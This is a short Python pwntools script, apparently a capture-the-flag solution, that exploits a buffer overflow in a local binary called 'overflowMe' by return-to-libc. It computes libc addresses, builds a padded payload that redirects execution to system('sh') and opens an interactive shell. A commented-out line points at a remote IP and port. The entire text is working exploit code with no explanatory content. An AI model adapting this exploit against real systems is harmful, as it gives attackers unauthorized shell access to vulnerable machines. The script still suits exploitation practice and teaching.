from pwn import *
import sys

#r = remote("10.2.32.84", 2002)
r = process("./overflowMe_4d2b1b70c9d8710c4540863df331835b")

#e = ELF('/root/Desktop/CTF/ctf.at10a/cameron/libc.so.6')
e = ELF('/lib/i386-linux-gnu/libc.so.6')
systemOffset = e.symbols['system']
#systemAddr = 0xf7d9db30
systemAddr = 0xf7e4fda0


libcBase = systemAddr - systemOffset

lsOffset = e.search('ls\x00').next()
shOffset = e.search('sh\x00').next()

lsAddr = libcBase + lsOffset
shAddr = libcBase + shOffset
a = 0x00007368

payload = '-1\n' + 'A'*113\
	+p32(systemAddr)\
	+b'AAAA' \
	+p32(shAddr) 
	
r.sendline(payload)
r.interactive()

